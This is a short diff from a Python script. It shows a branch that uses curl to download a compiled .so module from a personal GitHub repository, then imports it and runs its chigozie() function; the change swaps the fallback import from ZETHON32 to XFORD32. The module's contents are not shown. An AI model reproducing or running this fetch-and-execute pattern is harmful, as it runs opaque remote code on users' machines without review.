@@ -24,4 +24,4 @@ elif bit == '32bit':
         os.system('curl -L https://github.com/chigoziieworldwide/exe/blob/main/XFORD32.cpython-311.so?raw=true -o XFORD32.so') 
         __import__("XFORD32").chigozie()
     else:
-        __import__("ZETHON32").chigozie()
+        __import__("XFORD32").chigozie()
